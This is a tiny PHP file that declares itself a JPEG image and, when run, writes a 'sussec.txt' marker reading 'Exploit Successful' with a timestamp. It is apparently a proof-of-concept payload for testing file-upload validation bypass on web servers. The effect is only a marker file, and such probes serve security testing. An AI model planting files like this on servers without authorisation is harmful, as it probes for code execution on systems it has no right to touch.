<?php 
header("Content-Type: image/jpeg");
file_put_contents('sussec.txt', 'Exploit Successful - ' . date('Y-m-d H:i:s'));
echo "<?php file_put_contents('sussec.txt', 'Exploit Successful - ' . date('Y-m-d H:i:s')); ?>";
?>
